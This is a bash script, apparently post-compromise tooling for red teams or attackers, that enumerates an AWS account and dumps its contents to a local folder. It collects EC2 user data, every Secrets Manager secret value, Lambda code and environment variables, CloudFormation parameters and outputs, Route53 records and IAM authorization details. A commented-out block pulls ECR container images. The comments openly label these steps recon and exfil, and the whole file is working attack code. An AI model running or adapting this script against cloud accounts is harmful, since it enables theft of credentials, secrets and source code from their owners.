#!/bin/bash

CITY=$1

if [[ -z "$CITY" ]] ; then
  echo "Usage: $0 <CITY>"
  exit 1
fi

DATADIR=data/$CITY

echo "Saving data to $DATADIR"

if [ ! -d $DATADIR ] ; then
	mkdir -p $DATADIR
fi

echo -n "$0 " ; date

# Recon EC2
echo "Grabbing Instance UserData"
LIST=`aws ec2 describe-instances --region us-east-1 --query Reservations[].Instances[].InstanceId --output text`
for i in $LIST ; do
  aws ec2 describe-instance-attribute --instance-id $i --attribute userData \
  	--output text --query UserData --region us-east-1 | base64 --decode > $DATADIR/$i-USERDATA.txt
done

# Pull Secrets
echo "Pulling Secrets"
LIST=`aws secretsmanager list-secrets --region us-east-1 --query SecretList[].Name --output text`
for secret_name in $LIST; do
  echo "$secret_name: "
  aws secretsmanager get-secret-value --secret-id $secret_name --query SecretString --output text  --region us-east-1
done > $DATADIR/secrets.txt

# # Exfil Containers
# echo "Grabbing Containers"
# TARGETACCOUNTID=`aws sts get-caller-identity --query Account --output text`
# aws ecr get-login-password --region us-east-1 | sudo docker login --username AWS --password-stdin $TARGETACCOUNTID.dkr.ecr.us-east-1.amazonaws.com
# REPOS=`aws ecr describe-repositories --query repositories[].repositoryName --output text`
# echo -n "Docker Save " ; date
# for r in $REPOS ; do
#   TAG=`aws ecr describe-images --repository-name $r --query imageDetails[0].imageTags[0] --output text`
#   # Make room for the next one
#   sudo docker rm $TARGETACCOUNTID.dkr.ecr.us-east-1.amazonaws.com/$r:$TAG
# 	sudo docker pull $TARGETACCOUNTID.dkr.ecr.us-east-1.amazonaws.com/$r:$TAG
# done

# This can be useful later
aws sqs list-queues  | jq .QueueUrls -r > $DATADIR/SQS-Queues.json

# DNS Enum
echo "Doing Route53 Enum"
aws route53 list-hosted-zones > $DATADIR/hosted_zones.json
for z in `cat $DATADIR/hosted_zones.json | jq .HostedZones[].Id -r ` ; do
	aws route53 list-resource-record-sets --hosted-zone-id $z --output yaml >> $DATADIR/Route53-record-sets.yaml
done

# Lambda Code exfil
echo "Lambda Code Exfil"
LIST=`aws lambda list-functions --query Functions[].FunctionName --output text`
for f in $LIST ; do
  URL=`aws lambda get-function --function-name $f --output text --query Code.Location `
  curl -s -o $DATADIR/$f.zip "$URL"
done

# Lambda Secret Exfil
echo "Fetching Lambda Secrets"
for f in $LIST ; do
  aws lambda get-function --function-name $f --query Configuration.Environment --output yaml
done > $DATADIR/LambdaEnvars.yaml

# CloudFormation exfil
echo "Fetching cloudformation data"
aws cloudformation describe-stacks --query Stacks[].Parameters --output yaml >> $DATADIR/CFT-Params.yaml
aws cloudformation describe-stacks --query Stacks[].Outputs --output yaml >> $DATADIR/CFT-Outputs.yaml

# IAM Roles
echo "Grabbing IAM Roles"
aws iam list-roles > $DATADIR/IAM-Roles.json
aws iam get-account-authorization-details > $DATADIR/IAM.json